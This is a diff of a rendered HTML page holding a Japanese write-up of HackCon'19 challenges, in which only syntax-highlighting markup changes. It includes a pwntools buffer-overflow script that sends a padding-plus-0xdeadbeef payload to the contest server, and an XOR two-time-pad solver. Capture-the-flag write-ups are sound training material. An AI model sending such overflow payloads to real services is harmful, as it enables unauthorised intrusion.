@@ -95,7 +95,7 @@
     <li><a href="#終わりに">終わりに</a></li>
   </ul>
 </nav>
-			<h1 id="hackcon19に参加しました">HackCon'19に参加しました！</h1>
+			<h1 id="hackcon19に参加しました">HackCon&rsquo;19に参加しました！</h1>
 <p>(team:score_gazer)</p>
 <p>結果は705点で112位でした</p>
 <h2 id="baby-b0f-pwn-100-pt">baby b0f (Pwn 100 pt)</h2>
@@ -125,10 +125,10 @@ x/32xw $rbp
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solve.py" data-lang="solve.py"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">import</span> socket
 
-con <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;68.183.158.95&#39;</span>, <span style="color:#ae81ff">8989</span>)
+con <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">68.183.158.95</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">8989</span>)
 
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xef\xbe\xad\xde</span><span style="color:#e6db74">&#39;</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xef</span><span style="color:#ae81ff">\xbe</span><span style="color:#ae81ff">\xad</span><span style="color:#ae81ff">\xde</span><span style="color:#e6db74">&#39;</span>
 
 con<span style="color:#f92672">.</span>sendline(payload)
 con<span style="color:#f92672">.</span>interactive()
@@ -207,16 +207,16 @@ message1とmessage2に同じkeyをXOR（記号：^）して暗号化されてる
 <ul>
 <li>上記の計算をするプログラムを作って実行する</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solve.py" data-lang="solve.py">c1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x05</span><span style="color:#e6db74">F</span><span style="color:#ae81ff">\x17\x12\x14\x18\x01\x0c\x0b</span><span style="color:#e6db74">4&#39;</span><span style="color:#f92672">.</span>hex()
-c2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;</span><span style="color:#ae81ff">\x1f\x00\x14\n\x08\x07</span><span style="color:#e6db74">Q</span><span style="color:#ae81ff">\n\x0e</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>hex()
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solve.py" data-lang="solve.py">c1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x05</span><span style="color:#e6db74">F</span><span style="color:#ae81ff">\x17</span><span style="color:#ae81ff">\x12</span><span style="color:#ae81ff">\x14</span><span style="color:#ae81ff">\x18</span><span style="color:#ae81ff">\x01</span><span style="color:#ae81ff">\x0c</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">4</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>hex()
+c2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\x1f</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x14</span><span style="color:#ae81ff">\n</span><span style="color:#ae81ff">\x08</span><span style="color:#ae81ff">\x07</span><span style="color:#e6db74">Q</span><span style="color:#ae81ff">\n</span><span style="color:#ae81ff">\x0e</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>hex()
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">convert_cipher</span>(cipher):
     l_cipher <span style="color:#f92672">=</span> list(cipher)
     L <span style="color:#f92672">=</span> len(l_cipher)
     h_cipher <span style="color:#f92672">=</span> []
-    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(L <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>):
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(L <span style="color:#f92672">/</span><span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>):
         tmp <span style="color:#f92672">=</span> l_cipher[i <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>: i <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>]
-        tmp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(tmp)
+        tmp <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">0x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(tmp)
         h_cipher<span style="color:#f92672">.</span>append(tmp)
     <span style="color:#66d9ef">print</span>(h_cipher)
     <span style="color:#66d9ef">return</span> h_cipher
@@ -226,25 +226,25 @@ h_c2 <span style="color:#f92672">=</span> convert_cipher(c2)
 
 dec <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>
 
-dec[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74">&#39;d&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>))
-dec[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74">&#39;4&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>))
-dec[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>))
-dec[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74">&#39;k&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">3</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">3</span>], <span style="color:#ae81ff">16</span>))
-dec[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74">&#39;{&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>))
-dec[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74">&#39;}&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">5</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">5</span>], <span style="color:#ae81ff">16</span>))
-dec[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74">&#39;c&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">6</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">6</span>], <span style="color:#ae81ff">16</span>))
-dec[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">7</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">7</span>], <span style="color:#ae81ff">16</span>))
-dec[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74">&#39;d&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">8</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">8</span>], <span style="color:#ae81ff">16</span>))
-dec[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74">&#39;e&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">9</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">9</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">d</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">k</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">3</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">3</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">4</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">5</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">5</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">c</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">6</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">6</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">7</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">7</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">d</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">8</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">8</span>], <span style="color:#ae81ff">16</span>))
+dec[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> chr(ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">e</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">^</span> int(h_c2[<span style="color:#ae81ff">9</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> int(h_c1[<span style="color:#ae81ff">9</span>], <span style="color:#ae81ff">16</span>))
 
-m1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;d4rk{&#34;</span>
+m1 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">d4rk{</span><span style="color:#e6db74">&#34;</span>
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
-    m1 <span style="color:#f92672">+=</span> dec[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>]
+    m1 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> dec[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>]
 
-m2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+m2 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
-    m2 <span style="color:#f92672">+=</span> dec[i]
-m2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;}c0de&#34;</span>
+    m2 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> dec[i]
+m2 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">}c0de</span><span style="color:#e6db74">&#34;</span>
 
 <span style="color:#66d9ef">print</span>(m1 <span style="color:#f92672">+</span> m2)
 </code></pre></div><p>フラグゲット</p>
